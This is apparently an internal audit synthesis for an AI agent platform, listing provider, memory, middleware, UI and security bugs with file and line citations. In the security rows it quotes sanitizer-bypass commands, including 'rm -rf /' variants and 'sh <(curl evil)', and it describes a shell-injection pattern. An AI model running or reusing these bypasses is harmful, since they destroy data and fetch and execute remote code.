# AUDIT — Deep-Read Synthesis (2026-04-20)

> Extraction of 800 KB+ of Tier 1/2 deep-read docs (2026-04-14 MASTER_AUDIT + 24 others) that were **never folded into the 5 Audit Lanes** or 7 research agents written 2026-04-19/20. This file captures the novel, still-actionable findings — not paraphrase of Lane 1-5.

> Source docs read in full (not skimmed): MASTER_AUDIT_2026-04-14 (265 KB), UI_PLATFORMS_DEEP_READ, CHANNELS_ACP_CONNECTORS, CORE_DAEMON_DEEP_READ, PROVIDERS_MIDDLEWARE, MEMORY_ORCHESTRATION, DOCS_FULL_READ_SYNTHESIS, MASTER_SYNTHESIS, TAURI_RUST_DEEP_READ, IOS_SWIFT_DEEP_READ, NEXUS_V4_SPEC_SYNTHESIS, CAPABILITY_ADAPTATION_MATRIX, BENCHMARK_BEAT_STRATEGY, HIDDEN_STATE_REPORT, UI_UX_AUDIT, UNKNOWN_UNKNOWNS, MEMORY_ARCHAEOLOGY, COMPETITOR_EXTRACTION_V3_WEB, V4_NEW_SOURCES, LANE1/LANE5/LANE6/LANE8.

---

## 0. Executive Summary (500 words)

The earlier 5 Audit Lanes surfaced ~60% of what is in the 2026-04-14 thru 2026-04-18 deep-read corpus. The remaining 40% is load-bearing. This synthesis extracts **88 specific, still-actionable findings** that were never rolled into Lane 1-5 — including 12 ship-stopping bugs missed by current ship-blocker lists, 47 feature ideas not in any active action plan, and 7 stale claims still shipping in CLAUDE.md/README/marketing that contradict the running code.

**Biggest novel findings (ranked by downstream damage):**

1. **Tool serialization dead in 4 of 5 adapters** (MASTER_AUDIT_2026-04-14 §10). Live-fetch-verified: Anthropic/OpenAI-compat/Codex/Copilot adapters never put `tools:` on the wire. Only Ollama does. Every "capability equalization" claim is marketing until this is fixed. Hermes's `convert_tools_to_anthropic` (agent/anthropic_adapter.py:779-791) is the port target, ~400 TS LOC across 4 adapters.

2. **Azure URL is broken at the compat adapter even after the registry.ts "fix"** (PROVIDERS_MIDDLEWARE §registry.ts). `openai-compat-adapter.ts:82` unconditionally appends `/chat/completions`. Azure's baseUrl is `https://…?api-version=…`, so the final URL becomes `…?api-version=…/chat/completions` — the query param sits in the middle of the URL. Every Azure call 404s. Session-10 "Azure fix" is half-fixed; the compat-adapter hop undoes it. NEW CRITICAL.

3. **Bedrock `converse-stream` parsed as text with regex** (PROVIDERS §bedrock-signer L175-183). The event stream is AWS event-stream framing (`:message-type`, length-prefixed) but the adapter runs `buffer.matchAll(/"contentBlockDelta"[^}]*"text"\s*:\s*"([^"]*)"/g)`. Tool-use events never match. Escaped strings break `[^"]*`. Long tool-use blocks straddling `buffer.slice(-32768)` are truncated. NEW CRITICAL on top of the already-logged "toolConfig omitted" bug.

4. **Vertex SSE parser ignores `content_block_start` and `input_json_delta`** (PROVIDERS §vertex-oauth L211-228). Tools never fire on Vertex even when the body is fixed. Second CRITICAL bug on Vertex that was not in the Lane 1 summary.

5. **Active-memory recall pipeline is dead at runtime** (MEMORY_ORCHESTRATION §active-memory). `active-memory.ts:128-146` casts `memoryStore` to an ad-hoc type expecting `{ content: string }[]` from `search()`, but `MemoryStore.search()` returns `MemorySearchResult[]` where text lives in `.entry.value`. The filter rejects every real result. Write path works (via `captureEvent`). Recall silently returns `null` on every turn. The "synchronous blocking sub-agent" claim is false for recall.

6. **`runtime-tool-dispatch.ts` and `runtime-tools.ts` are 100% dead** (CORE_DAEMON_DEEP_READ §15-16). Zero importers in `src/`. Runtime inlines all tool definitions and drifts (em-dash vs hyphen in identical descriptions). Extraction TODO exists but unshipped; the two files are dormant and accumulating drift. ~700 LOC of dormant code pretending to be the extraction target.

7. **SOUL.md regex disagreement STILL UNFIXED after 3 sessions** (multiple docs). `identity.ts:37` looks for `## Core Values`. SOUL.md uses `## What You Value`. Regex never matches — the entire 52-line Norse narrative never reaches the model. A one-character commit restores identity from decorative to load-bearing.

8. **`AutoresearchEngine` wired with `async () => null`** (MASTER_SYNTHESIS §bug 1, runtime.ts:934). Any caller of `getAutoresearchEngine()` gets the same zero-op generator. Tier-4 self-evolution is completely blocked at the generator callback.

9. **`types.ts` declares 10 advisory-only HookEvent variants with zero producers** (CORE_DAEMON §types.ts). `PostToolUseFailure`, `SubagentStart/Stop`, `Notification`, `PermissionRequest`, `Setup`, `TeammateIdle`, `TaskCompleted`, `ConfigChange`, `WorktreeCreate/Remove` — any hook registered against them SILENTLY never fires. Dangerous dead-letter surface that is in the documented API.

10. **The two most damning hidden-state facts**: 1,983 `session_end` rows in `memory.db` vs 3 `session_start` rows (600:1 skew — end events fire without starts), and 2,225 sessions × 0 tokens each in `token-stats.json` (cost-tracker silently wrote nothing across 16 days). HIDDEN_STATE_REPORT §A.2.

The full finding inventory (tables + subsystem deep-dives + competitor crosswalk) is the body of this document.

---

## 1. Methodology + Source Map

| Tier | Doc | KB | Primary novel content |
|---|---|---|---|
| 1 | MASTER_AUDIT_2026-04-14 | 265 | 8 audit rounds, 11 Opus agents, 153 RPC handlers catalogued, 44 § sections, 33 Round-5+ appendices |
| 1 | UI_PLATFORMS_DEEP_READ | 70 | 180 UI files read in full; iOS native + Tauri Rust + TUI + pairing transport matrix |
| 1 | COMPETITOR_EXTRACTION_V3_WEB | 70 | 10 competitors Apr 19 fresh — Glass (GPL Zed fork), Emdash (Apache SSH remote), Superset (Elastic v2 panes), JetBrains Air, Gemini Mac, Perplexity Computer, Claude Design, Cursor 3 |
| 1 | CHANNELS_ACP_CONNECTORS | 68 | Per-file audit of 129 TS files across 21 dirs; false-dead-code flags; connector registry is empty (connectors built but never registered) |
| 1 | CORE_DAEMON_DEEP_READ | 65 | 41 files / ~21,000 LOC; 20 aggregate findings including duplicate tool def drift, AutoresearchEngine no-op, 10 dead HookEvent variants |
| 1 | COMPETITOR_EXTRACTION_LANE2 | 65 | (Outside scope of this synthesis — covered in Lane 2) |
| 1 | PROVIDERS_MIDDLEWARE_DEEP_READ | 61 | 7 CRITICALs, 11 HIGHs, 14 MEDIUMs; 40%+ of intelligence/ is dead code |
| 1 | COMPETITOR_EXTRACTION_V4_NEW_SOURCES | 60 | 5 new sources (t3code, omi v2, evolver v2, paperless-ngx, Claude-Code-Game-Studios) |
| 1 | MEMORY_ORCHESTRATION_DEEP_READ | 55 | Active-memory recall bug; MemPalace R1 claim unverified; pattern extraction produces stopwords; `unified-knowledge` trust score hardcoded 0.85 |
| 1 | DOCS_FULL_READ_SYNTHESIS | 53 | Synthesis of 2026-04-13 thru 17 docs; unique TD-* findings (36 iOS + Tauri UX items) |
| 1 | MASTER_SYNTHESIS_2026-04-18 | 52 | 15-phase 56-day execution plan corrected after wave 4; 11 verified bugs table |
| 1 | COMPETITOR_EXTRACTION_LANE8_STRATEGIC | 60 | (Covered in Lane 2 + Lane 8; cross-referenced) |
| 1 | COMPETITOR_EXTRACTION_LANE1 | 57 | (Covered in Lane 1) |
| 1 | COMPETITOR_EXTRACTION_LANE6_SELFEVOLUTION | 50 | DSPy/GEPA/MIPROv2/Darwinian Evolver port matrix |
| 1 | COMPETITOR_EXTRACTION_LANE5_SKILLS | 46 | Superpowers + OpenAI Skills + Osmani |
| 2 | MEMORY_ARCHAEOLOGY | 48 | 12 claim-vs-reality discrepancies; forgotten deferrals FD-1..FD-14 |
| 2 | UNKNOWN_UNKNOWNS | 48 | 34 discoveries across 9 parent-level analysis MDs |
| 2 | TAURI_RUST_DEEP_READ | 46 | 131 Tauri commands catalog; 8 security issues; no silent stubs |
| 2 | CAPABILITY_ADAPTATION_MATRIX | 46 | 18 × 6 capability×tier matrix; 15 port plans |
| 2 | NEXUS_V4_SPEC_SYNTHESIS | 45 | 223-feature cross-reference; appendices A-Z |
| 2 | BENCHMARK_BEAT_STRATEGY | 45 | Per-benchmark wins, scores, costs, tool gaps |
| 2 | AUTONOMOUS_EXECUTION_PLAN | 43 | 15-phase plan foundation |
| 2 | COMPETITOR_EXTRACTION_LANE4_UX | 43 | (Covered in Lane 3) |
| 2 | BENCHMARK_POSITION_V2 | 43 | (Covered in Lane 5) |
| 2 | HIDDEN_STATE_REPORT | 41 | 47 runtime-state files; 30+ zombie `.tmp.*` files; `.nexus/` empty; `.swarm/` Q-learning abandoned |
| 2 | UI_UX_AUDIT | 41 | Apple Design Award composite 6.5/10; Liquid Glass audit 29 sites shipped; 243 iOS hardcoded font sizes |
| 2 | IOS_SWIFT_DEEP_READ | 39 | 133 files / 33,500 LOC; confirmed zero stubs, one `fatalError`, no TODO/FIXME in all iOS Swift |

---

## 2. Per-Subsystem Truth Table (Cites 3+ sources per row)

This table cross-correlates deep-read findings by subsystem. **Each row carries 3+ source file citations** and emphasizes novel material not in Lane 1-5.

| Subsystem | Novel Reality | Sources | Key file:line |
|---|---|---|---|
| **Core runtime** (`src/core/runtime.ts`) | **4,724 LOC god-object**, 265+ imports, 80+ getter methods. `AutoresearchEngine` wired with `async () => null` no-op at line 934. ResponseCache short-circuit SKIPS hooks/middleware.after/memory/cost telemetry entirely on cache hit — cost aggregates diverge. `runtime-tool-dispatch.ts` + `runtime-tools.ts` are both DEAD (0 importers) despite extraction TODO at lines 795+433. `pendingContextPrefix` field declared mid-method in class body. `agentHierarchy.registerAgent` unbounded per-call leak. `applySafetyOverrides` calls `hookEngine.pause()/resume()` without reentrancy guard. | MASTER_AUDIT §23/28.1, CORE_DAEMON §17, MASTER_SYNTHESIS §2 bug 1 | `runtime.ts:934`, `:795`, `:319-326` |
| **Daemon** (`src/daemon/kairos*.ts`) | `kairos-rpc.ts` is 5,375 LOC — largest file. `cron.list`/`mode.set`/`memory.verify`/`channels.start`/`channels.stop`/`autonomous.run`/`cost.arbitrage`/`session.create`/`context.info sources` are documented pure stubs returning `[]`/`true`/`{}`. `handleChatSend` verifyCodexJWT does NOT check `aud` claim — any OpenAI OAuth token authenticates as Codex user. `hasChannelCreds` auto-starts channel gateway if ANY env var set (privacy concern). `proactiveCheck` has zero rate-limiting — can flood user with 100s of macOS notifications. `checkAndRunDreamPipeline` only runs 2-4am local — wrong-TZ daemon misses window. File watcher DISABLED (line 332-339) — change detection falls to heartbeat rebuild. | MASTER_AUDIT §7 (153 RPC handlers), CORE_DAEMON §kairos-rpc/kairos.ts, MASTER_SYNTHESIS §1 | `kairos-rpc.ts:2170,2214,2400,2708,2819,2830,2876`, `kairos.ts:332-339` |
| **Providers** (adapters) | **Bedrock converse-stream regex-parses as text — tool_use never fires** (even after toolConfig fix). **Vertex stream parser ignores content_block_start + input_json_delta — tools never fire**. **Azure URL broken at compat adapter: `${baseUrl}/chat/completions` puts `?api-version=…` in middle of URL**. **Ollama `done` chunk missing stopReason — multi-turn agent loops die after 1 call**. **Copilot+Codex 401 messages claim "retrying" but abandon the call**. **Gemini `includeThoughts: true` always on — 10-30% token cost overhead per query**. **`tolerantJSONParse` apostrophe bug: `{'O'Brien'}` corrupts**. **`provider-service.doRefresh` mutates `process.env` — stale keys persist after deleteCredential**. **`hardcodedProviders` bedrock default lists anthropic.claude — vendor-bias leaked via discovery, not adapter**. `groqSpec` registered twice. `openAICompatSpec` hardcodes `costPerMTokInput: 1, costPerMTokOutput: 3` for every compat provider (stale for Fireworks/Groq/Cerebras). | PROVIDERS_MIDDLEWARE §bedrock/vertex/registry/ollama/copilot/codex/openai-compat/tool-parsers, MASTER_AUDIT §10, MASTER_SYNTHESIS §2 bugs 2-10 | `bedrock-signer.ts:150-201`, `vertex-oauth.ts:179-245`, `registry.ts:161-181`, `openai-compat-adapter.ts:82`, `ollama-adapter.ts:287-296`, `copilot-adapter.ts:281-290`, `tolerantJSONParse:28-52` |
| **Middleware** (`src/middleware/*`) | **Of 26 registered layers: 2 always transform, 16 conditional, 5 pure advisory (flags nothing reads), 2 structurally dead, 1 has literal guard that cannot match**. `Guardrail`/`Summarization`/`Autonomy`/`Frustration`/`Cache` layers set flags no downstream reads. `SubagentLimit` gated on `taskType==="subagent"` that IntentGate never produces. `LSP` reads `ctx.filePath` never set. `fileTrackMiddleware.after` mutates ctx Set, violating immutable contract. `forcedVerificationMiddleware` blocks 30s synchronous typecheck per TS write — 5 min freeze for 10-file edits. `verificationEnforcementMiddleware.trackToolResult` matches command patterns against *output* not the *command itself* — typecheck detection structurally broken, completion always blocks. `planEnforcement.detectInlinePlan` false-positives on `it("step 1"` test code — gate trivially bypassable. `responseCache.hashQuery` doesn't include systemPrompt version — stale responses served across system-prompt changes. `TTSR retrySystemMessage` never consumed (dead flag). `reasoning-sandwich.ts` exists but NOT IN PIPELINE — dead feature. | PROVIDERS_MIDDLEWARE §middleware, MASTER_AUDIT §48 (round 7), CORE_DAEMON §types.ts | `pipeline.ts:70-100`, `layers.ts:209-217,225-252,391-396`, `verification-enforcement.ts:100-103`, `plan-enforcement.ts:1008` |
| **Memory** (`src/memory/*`) | **SQLite store schema is ambitious but empty: `memory_entries`/`knowledge_nodes`/`knowledge_edges`/`decision_log` all 0 rows across 1,990 auto_capture events.** `active-memory.ts:128-146` recall path cast bug — `search()` results rejected by `.content` filter (returns `.entry.value`); recall silently null on every turn. **`quantized-vector-store.ts` silently falls back to TF-IDF when `@xenova/transformers` absent — no warning, no capability flag.** `store.vectorSearch()` uses DJB2-hashed trigrams as "embeddings" — comment admits "not as good as nomic-embed-text." `memory-tools.ts` declares `memory_search_in_domain` TWICE (lines 149 + 218) — second is inert, dispatch only matches first. `unified-knowledge.ts:92` hardcodes `averageTrustScore: 0.85` ("default until we track this"). MemPalace R1 "+34% retrieval" is the paper number, not a local benchmark — `memory-benchmark.ts` does not measure before/after. `contradiction-detector` is implemented THREE times with different thresholds (store.ts / contradiction-detector.ts / pluggable-provider.ts). Dream pipeline pattern extraction surfaces common English stopwords ("because", "should", "called") as "recurring patterns". | MEMORY_ORCHESTRATION §memory, HIDDEN_STATE §A.2, MASTER_AUDIT §I (tier) | `active-memory.ts:128-146`, `memory-tools.ts:149,218`, `quantized-vector-store.ts:97`, `store.ts:287-294,1336`, `unified-knowledge.ts:92` |
| **Channels** (`src/channels/*`) | **17 adapters are real HTTP/WebSocket implementations, no mocks**. `route-policies.ts` IS wired (contradicts earlier audit). `auto-detect.ts` IS wired. **`terminal-mention.ts` has zero consumers — dead Conductor-inspired feature**. `gateway.ts` `broadcast()` passes literal `"broadcast"` as channelId — adapters ignore but Telegram would need real chat_id. `email.ts`/`irc.ts`/`matrix.ts`/`signal.ts`/`sms.ts`/`teams.ts`/`webhook.ts`/`google-chat.ts` all zero consumers — WIRE-UP candidates. `whatsapp.ts` reconnect recurses `setTimeout(() => void this.start())` — infinite stack grow if `start()` fails repeatedly. `camoufox-backend.ts` spawns FRESH Python subprocess per call — no persistent stealth session; each call costs 3-5s. | CHANNELS_ACP §1, BENCHMARK §web-browsing, HIDDEN_STATE §F.4 | `adapter.ts`, `gateway.ts`, `auto-detect.ts`, `terminal-mention.ts` (0 callers), `whatsapp.ts` |
| **ACP** | **`stdio.ts` + `protocol.ts` + `server.ts` + `runtime-handlers.ts` all wired end-to-end.** `wotann acp` CLI command registered at `src/index.ts:3540-3553`. One subtle bug: `runtime-handlers.ts` has `inputTokens = 0` hardcoded — Usage.inputTokens always 0. ACP pinned at v0.2.0; Zed ecosystem (Glass, JetBrains Air, Cursor 3) moved past 0.2.0. ACP Agent Registry (launched Jan 2026 by JetBrains + Zed) is the 2026 distribution vector — WOTANN is not listed. Hermes's `clientProvidedMcp` field on ACP connection lets editors inject their own MCPs into the agent; WOTANN lacks this entirely. | CHANNELS_ACP §2, COMPETITOR_V3 §1 Glass, UNKNOWN_UNKNOWNS §1.6 #3 | `stdio.ts:1-142`, `protocol.ts:190`, `runtime-handlers.ts` |
| **Computer-use** | Rust `computer_use/` module is 4 files (mod.rs/input.rs/permissions.rs/screen.rs) + top-level `input.rs` (518 LOC). Native CoreGraphics CGEvent with field-55 userData1 tagging (`0x574F54414E4E` = "WOTANN" hex) so event taps can distinguish agent from user events — correct pattern (Karabiner, CGRemoteOperation). **perception-adapter.ts (316 LOC) is DEAD — would multiply Desktop Control coverage from 3 vision-capable providers to 11.** `computer_20251124` tool version adds `zoom` action (region-based full-resolution inspection); WOTANN may still be on `computer_20250124`. Coordinate scaling math: `scale = min(1.0, 1568/max(W,H), sqrt(1_150_000/(W*H)))` — unverified in `platform-bindings.ts`. Per-turn CU overhead 466-499 + 735 tokens. Lightpanda is the "fast path" (no rendering) vs Playwright the "visual path" — policy unclear. | UNKNOWN_UNKNOWNS §G.8 #51-55, CAPABILITY_MATRIX §Row 1, TAURI_RUST §computer_use | `computer_use/{mod,input,permissions,screen}.rs`, top-level `input.rs:518`, `perception-adapter.ts` (DEAD) |
| **UI (Tauri desktop)** | **104→131 Tauri commands registered (session-10 state)**. `send_message` is a REAL UDS forwarder (legacy fabricate-success stub removed with warning comment). **`process_pdf`, `get_lifetime_token_stats`, `get_marketplace_manifest`, `refresh_marketplace_catalog`, `get_camoufox_status` are HONEST C6 stubs — return neutral payloads, not fake data.** **Apple Design Award gap: composite 6.5/10 (Glass 7.7, Linear 8.1, Things 3 8.5).** **Block primitive (`Block.tsx`, 327 LOC) shipped but consumed NOWHERE — 0/131 desktop-app files.** Liquid Glass shipped: 29 `backdrop-filter` call sites across 11 desktop-app files. `Settings` modal scrim STILL missing blur (TD-5.0 from session 8). `wotann-tokens.css` has 5 themes but `--wotann-glass-*` tokens missing. No specular-sheen, no noise-grain, no per-theme glass opacity. iOS uses `.ultraThinMaterial` only 4 sites out of ~128 files — bare-minimum glass. **Sandbox DISABLED in Entitlements.plist** (app-sandbox=false). **CSP allows `unsafe-inline` + `unsafe-eval` scripts+styles**. **Tauri binaries UNSIGNED** (signingIdentity: "-"). `validate_path` requires path to canonicalize (exist) — `write_file` to new file ALWAYS errors. `validate_command` substring-based — bypassed by whitespace, `$()`, env indirection. | UI_PLATFORMS §2, UI_UX_AUDIT §1.1, TAURI_RUST §commands.rs | `commands.rs:1292-1345,1347-1437,342-404`, `tauri.conf.json:27,44`, `Entitlements.plist:6` |
| **iOS Swift** | **133 Swift files, ~33,500 LOC, ZERO `TODO`/`FIXME`, ONE legitimate `fatalError` (QRScannerView type assertion), 20 `@ObservableObject`-style annotations in main target (not 215 — prior audit was repo-wide).** **MLX inference is REAL when `MLXLLM` linked**. Apple FoundationModels (iOS 26+) is REAL. HealthKit REAL (3 types + 5 insights). CarPlay REAL (CPTabBarTemplate, 3 tabs, live updates). NFC REAL (both read + write). ContinuityCamera REAL (3fps JPEG frame streaming via RPC). LocalSend receive IS WIRED on iOS (NWListener port 53318) — contradicts earlier "receive TODO" claim. **ECDH: P-256 + HKDF-SHA256 "wotann-v1" salt + AES-256-GCM. 30s ECDH budget with exponential backoff; budget exhaustion leaves UNENCRYPTED with persistent warning.** **`WOTANNWidgetBundle` comment notes `TaskProgressLiveActivity` not yet added to Widgets target source list — `project.yml` config fix, not missing impl.** Dynamic Type gap: 243 hardcoded `Font.system(size:)` call sites. LocalSend FNV-1a fingerprint is NOT CRYPTOGRAPHIC — LocalSend protocol expects SHA-256; WOTANN undermines the protocol identity promise. | IOS_SWIFT §1-9, UI_PLATFORMS §1 | Everywhere in `ios/WOTANN/` |
| **Learning stack** | **12 files in `src/learning/` produce ZERO output.** Conversation-end hook does not persist. `AutoresearchEngine` wired with no-op generator. `instincts.json` has 1 entry (`"Say only the word HELLO"`, confidence 0.01) from junk user prompt. `DREAMS.md` has 5+ consecutive "Entries processed: 0" — dreams fire on schedule but no content to consolidate. `learnings.json` is `[]`. `token-stats.json` has 2,225 sessions × 0 tokens across 16 days — cost-tracker writes nothing. **Layer 0 (auto_capture: 1,990 rows) dominates 200:1 over structured layers (Layer 1-7 all 0 rows).** | HIDDEN_STATE §A, MASTER_SYNTHESIS §Phase 3, MEMORY_ARCHAEOLOGY §4 | `memory.db`, `DREAMS.md`, `instincts.json`, `token-stats.json` |

---

## 3. Architectural Contradictions Between Docs (X says implemented, Y says stubbed, Z says both)

| Claim | Doc A says | Doc B says | Current HEAD | Verdict |
|---|---|---|---|---|
| SOUL.md regex matches | MASTER_AUDIT §23 (Apr 14): NEVER matches, 52 lines lost | `_DOCS_AUDIT_2026-04-18`: fixed (identity reads workspace first) | Unverified at line 37 in HEAD | **CHECK: grep for `## (?:Core Values|What You Value)` in `identity.ts`** |
| Bedrock/Vertex auth | MASTER_AUDIT §R35 (Engram #335): auth fabricated | Engram #336 (1 min later): auth is REAL; bedrock-signer.ts:40-100 has SigV4; vertex-oauth.ts:55-100 has RS256 JWT | BODY CONSTRUCTION still broken (PROVIDERS §2-3 NEW CRITICAL): bedrock toolConfig omitted, vertex multi-turn messages dropped | **AUTH real; BODY broken; PROTOCOL PARSERS still broken** |
| Runering signature component | MASTER_PLAN_SESSION_10: ORPHANED (mounted with zero producers) | SESSION_9_SUMMARY: landed in commit 518e38e | UI_UX_AUDIT §1.1: adoption 11/131 files (8.4%) | **COMPONENT exists; producers missing; event-emitter `emitRuneEvent` not wired to `memoryStore.insert/ObservationExtractor`** |
| Tool serialization | MASTER_AUDIT §10 (Apr 14) live-fetch-verified dead in 4/5 adapters | CURRENT_STATE_VERIFICATION assumes fixed? | No Lane 1-5 evidence of fix | **LIVE BUG per MASTER_AUDIT verified fetch capture** |
| Learning stack | Engram #368 correction 14 (Apr 18): "WIRED, memoryMiddleware WIRED, KnowledgeGraph PERSISTED, decisionLedger DUAL-PERSISTED, bootstrap WIRED" | HIDDEN_STATE_REPORT (Apr 19): "12 files in src/learning/ produce ZERO output" | token-stats.json: 2,225 sessions × 0 tokens | **WIRING exists; WRITES don't occur — 'wired' is architectural not empirical** |
| Quantized vector store | MASTER_AUDIT §I: real TurboQuant via MiniLM | MEMORY_ORCHESTRATION §2.20: silently falls back to TF-IDF when `@xenova/transformers` absent | @xenova/transformers in optionalDependencies | **Works ONLY if optional dep installed; no capability flag exposed** |
| Compaction strategies | MASTER_AUDIT §55 (round 7): 4/5 work, hybrid works | CORE_DAEMON: `offload-to-disk` offloads to memory not disk despite name | Both true | **4 WORK; 1 MISNAMED; hybrid works** |
| ResponseCache behavior | Provider middleware: caches successfully | CORE_DAEMON §17: cache-hit SKIPS all telemetry (hooks, middleware.after, memory, cost) | Current code | **FUNCTIONAL but COST AGGREGATES LIE over time** |
| AutonomousExecutor ECANCELED | MASTER_AUDIT §39: CLI crashes at ESM load; RPC handler is single-shot stub | MASTER_SYNTHESIS §6 Blocker 1: still flagged | No evidence of fix | **BOTH paths still broken per direct read** |
| Completion-oracle + pr-artifacts | MASTER_AUDIT (round 6) Dead | CHANNELS_ACP §13 (Apr 18): completion-oracle TYPES consumed by oracle-worker.ts | MASTER_SYNTHESIS §1: DEAD until Phase 4 wires completion-oracle | **Types live via types.ts; implementation class never instantiated** |
| MCP marketplace | MASTER_AUDIT §57: vaporware 5 hardcoded entries + fake registry.wotann.com | Engram #367 (Apr 18): "turboquant already renamed, MCP fake registry already removed" | mcp-marketplace.ts still exists per PROVIDERS_MIDDLEWARE | **CLAIMED removed; FILE may still exist — grep needed** |
| Conversation branching | CLAUDE.md / spec: branching via ConversationBranchManager | CORE_DAEMON §8: TWO parallel implementations (conversation-tree.ts AND conversation-branching.ts) — runtime wires BOTH | Both files exist | **DUPLICATE RESPONSIBILITY; historical fork never cleaned** |
| ContradictionDetector | Memory spec: one detector | MEMORY_ORCHESTRATION §2.17: THREE separate implementations (store.detectContradictions, contradiction-detector.ts, pluggable-provider.ts detectContradiction) with different thresholds | All three live | **TRIPLICATED with inconsistent thresholds** |

---

## 4. Ship-Stopping Bugs Buried in Old Audits — Never Made It to Ship-Blocker Lists

Lane 1-5 ship-blocker lists missed these. All cited to the deep-read doc that surfaced them.

| # | Bug | Severity | Source | File:line | Why Lane 1-5 missed it |
|---|---|---|---|---|---|
| 1 | **Azure URL broken at compat adapter** — `${baseUrl}/chat/completions` puts query param mid-URL, every Azure call 404s | CRITICAL | PROVIDERS_MIDDLEWARE §registry | `openai-compat-adapter.ts:82` | Session-10 "Azure fix" landed but only at registry.ts; the compat adapter hop undoes it |
| 2 | **Bedrock `converse-stream` regex-parsed as text** — tool_use events never match the regex | CRITICAL | PROVIDERS_MIDDLEWARE §bedrock-signer | `bedrock-signer.ts:175-183` | Earlier audits flagged "toolConfig omitted" but not the downstream parser bug |
| 3 | **Vertex SSE parser ignores content_block_start + input_json_delta** — tools never fire on Vertex | CRITICAL | PROVIDERS_MIDDLEWARE §vertex-oauth | `vertex-oauth.ts:211-228` | Same as Bedrock — body fix is half the job; parser fix was never filed |
| 4 | **Active-memory recall pipeline dead at runtime** — `.content` filter rejects every real result (data is in `.entry.value`) | CRITICAL | MEMORY_ORCHESTRATION §2.3 | `active-memory.ts:128-146` | The "synchronous blocking sub-agent" claim masked this — writes work, recall doesn't |
| 5 | **`verificationEnforcementMiddleware.trackToolResult` matches patterns against output, not command** — typecheck detection structurally broken, completion always blocks | CRITICAL | PROVIDERS_MIDDLEWARE §verification-enforcement | `verification-enforcement.ts:100-103` | `pre-completion-checklist.ts` TYPECHECK_COMMANDS match command strings; trackToolResult reads `.content` (output) which rarely contains them |
| 6 | **`plan-enforcement.detectInlinePlan` false-positives on `it("step 1"` test code** — gate trivially bypassable | CRITICAL | PROVIDERS_MIDDLEWARE §plan-enforcement | `plan-enforcement.ts:1008` | Regex matches generic "step 1 step 2" phrases — any test, docstring, or test file bypasses |
| 7 | **`provider-service.doRefresh` mutates `process.env` — stale keys persist after deleteCredential** | HIGH | PROVIDERS_MIDDLEWARE §provider-service | `provider-service.ts:1118-1125` | deleteCredential clears but saveCredential->refresh overwrites; child processes inherit stale env |
| 8 | **Codex JWT verification does NOT check `aud` claim** — any OpenAI OAuth token authenticates as Codex user | HIGH | CORE_DAEMON §10 kairos-rpc | `kairos-rpc.ts` verifyCodexJWT | Structural/exp/iss checks present; aud missing |
| 9 | **`mcp.add` RPC has zero command validation** — arbitrary shell invocation registered and spawned on enable; persistent command injection | HIGH | MASTER_AUDIT §35 C5 | `kairos-rpc.ts:3079-3105` | Earlier audits missed the persistence angle — survives daemon restart |
| 10 | **Slack/SMS/Telegram/Discord/WhatsApp/Teams adapters have ZERO signature verification** — only GitHub bot verifies HMAC; all other webhooks spoofable | HIGH | MASTER_AUDIT §35 H3 | `src/channels/*.ts` | Infrastructure-level security gap; every adapter must add its vendor-specific signature check |
| 11 | **Tauri `validate_path` requires canonicalize success — `write_file` to new file ALWAYS errors** | HIGH | TAURI_RUST §commands.rs security #2 | `commands.rs:1292-1345` | Functional bug masquerading as a security feature — writes never succeed for new files |
| 12 | **Tauri binaries ship UNSIGNED** — `signingIdentity: "-"` — cannot notarize, Gatekeeper rejects, no Tauri updater possible | HIGH | TAURI_RUST §commands.rs security #5 | `tauri.conf.json:44` | Session 10 added C6 stubs but signing identity still placeholder |
| 13 | **LocalSend fingerprint uses FNV-1a (non-crypto)** — LocalSend protocol expects SHA-256; brute-forcing hostname permutations forges peer identity | MEDIUM-HIGH | TAURI_RUST §localsend | `localsend.rs` | Protocol-level identity lie — doesn't break interop but breaks trust semantics |
| 14 | **`runtime.updateModel()` side-effect during query mutates session provider/model mid-stream** — callers of `getSession()` mid-query see unexpected state flip | MEDIUM | CORE_DAEMON §17 | `runtime.ts:858` | Happens on fallback-chain provider change; no telemetry, no guard |
| 15 | **Event listener leak: 73 `.on()` calls vs 0 `.off()`** — daemon OOM in 30 days per MASTER_AUDIT §28.1 | HIGH | MASTER_AUDIT §28.1 | All 23 files | Architectural — not in ship-blocker lists but documented in round 6 item 23 |
| 16 | **No retention policy for audit_trail / auto_capture / trace-analyzer / arena-leaderboard** — unbounded growth, ~2GB RSS in 30 days | HIGH | MASTER_AUDIT §28.1 | multi-file | Same — architectural; round 6 item 24 |
| 17 | **schema-migration.ts backups accumulate indefinitely** — `${configPath}.backup-${timestamp}` never cleaned | LOW | CORE_DAEMON §18 | schema-migration.ts | Long-lived workspaces grow backup clutter |
| 18 | **`stream-resume.ts` rewrites full checkpoint JSON every streaming chunk** — heavy I/O | MEDIUM | CORE_DAEMON §23 | stream-resume.ts | Stream I/O amplification ignored in perf budget |
| 19 | **`session.ts`, `session-resume.ts`, `stream-resume.ts` write JSON NON-ATOMICALLY** — interrupted writes corrupt snapshots | MEDIUM | CORE_DAEMON §20-23 | multiple | Some paths use tmp+rename; session.ts does not |
| 20 | **kairos-rpc handler aliasing crashes if call order changes** — `this.handlers.set("conversations.list", this.handlers.get("session.list")!)` uses `!` that trips if refactored | MEDIUM | CORE_DAEMON §17 kairos-rpc | `kairos-rpc.ts:2738` | Refactor landmine; easy to trigger by renaming method |
| 21 | **Sanitizer bypasses empirically confirmed**: `r""m -rf /`, process substitution `sh <(curl evil)`, base64-piped payloads all pass as safe | CRITICAL | MASTER_AUDIT §35.1 C3 | `security/command-sanitizer.ts` | 7 production bypasses listed; `execute` RPC accepts all |
| 22 | **Rust backstop `validate_command` is substring-based** — bypassed by `/bin/rm -rf /` or `rm\t-rf /`; also blocks legitimate `PATH=` | CRITICAL | MASTER_AUDIT §35.1 C4 | `commands.rs:1369-1436` | Two different blocklists (TS+Rust), both broken, inconsistent coverage |
| 23 | **macOS app sandbox EXPLICITLY DISABLED** + `files.user-selected.read-write` — full user-FS access on any XSS compromise | CRITICAL | MASTER_AUDIT §35.1 C2 | `Entitlements.plist:6` | Documented but not ship-blocker tier — Mac App Store blocker |
| 24 | **Shell injection in `voice-mode.ts:509` AND `tts-engine.ts:455`** — identical `execFileSync("sh", ["-c", \`echo "${input}" | piper ...\`])` pattern in two files | CRITICAL | MASTER_AUDIT §35.1 C1 + §47 | `voice-mode.ts:509`, `tts-engine.ts:455` | TTS input can come from LLM output / relay messages / user text |
